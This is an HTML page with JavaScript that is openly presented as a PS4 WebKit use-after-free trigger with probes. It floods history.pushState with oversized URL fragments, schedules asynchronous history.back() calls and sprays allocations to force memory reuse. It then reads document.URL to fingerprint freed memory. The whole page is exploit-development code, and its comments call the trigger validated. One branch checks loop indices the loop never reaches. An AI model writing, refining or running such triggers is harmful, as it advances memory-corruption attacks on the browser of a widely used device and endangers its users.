<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF – Fragment Fingerprinting (A/B/C)</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; padding:16px; }
button { margin:4px; padding:8px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – UAF Fragment Fingerprinting</h2>

<button onclick="runTest('A')">Run Test A (AAAA)</button>
<button onclick="runTest('B')">Run Test B (BBBB)</button>
<button onclick="runTest('C')">Run Test C (CCCC)</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(msg){ logEl.textContent += msg + "\n"; }

/* =========================
   UAF TRIGGER (VALIDATED)
   ========================= */
function triggerUAF(patternChar) {
    log("=== START UAF TRIGGER ===");
    let base = 380000;
    let step = 14500;

    for (let i = 0; i < 45; i++) {
        let size = base + i * step;

        if (i === 46 || i === 48) {
            let small = "#".repeat(32);
            history.pushState({}, "", location.pathname + small);
            log("[ITER " + i + "] alternating fragment size=32");
        } else {
            let big = "#" + patternChar.repeat(size);
            history.pushState({}, "", location.pathname + big);
            log("[ITER " + i + "] size=" + size);
        }

        if (i % 6 === 0) {
            setTimeout(() => {
                history.back();
                log(" history.back() ASYNC scheduled");
            }, 0);
        }
    }

    log(">>> ENTERING CRITICAL WINDOW <<<");

    // Reuse pressure (já validado por vocês)
    let trash = [];
    for (let i = 0; i < 2000; i++)
        trash.push(new Uint8Array(32));
    for (let i = 0; i < 1000; i++)
        trash.push({a:i,b:i+1,c:i+2});

    log("=== END TRIGGER ===");
}

/* =========================
   POST-UAF PROBES
   ========================= */
function postUAFProbe(tag) {
    log("--- POST-UAF READ PROBE (" + tag + ") ---");

    try {
        let url = document.URL;
        log("document.URL.length = " + url.length);

        let needle = tag.repeat(4);
        log("URL.includes(" + needle + ") = " + url.includes(needle));

        let p0 = url.charCodeAt(0);
        let p1 = url.charCodeAt(1024);
        let p2 = url.charCodeAt(32768);

        log("charCodeAt(0) = " + p0);
        log("charCodeAt(1024) = " + p1);
        log("charCodeAt(32768) = " + p2);
    } catch(e) {
        log("Exception during probe: " + e);
    }

    log("history.length = " + history.length);
    log("--- END PROBE ---");
}

/* =========================
   TEST ENTRY POINT
   ========================= */
function runTest(mode) {
    logEl.textContent = "";
    log("=== RUN TEST " + mode + " ===");

    triggerUAF(mode);

    // leitura atrasada para pegar reuse real
    setTimeout(() => {
        postUAFProbe(mode);
        log("=== END TEST " + mode + " ===");
    }, 50);
}
</script>

</body>
</html>





    
    
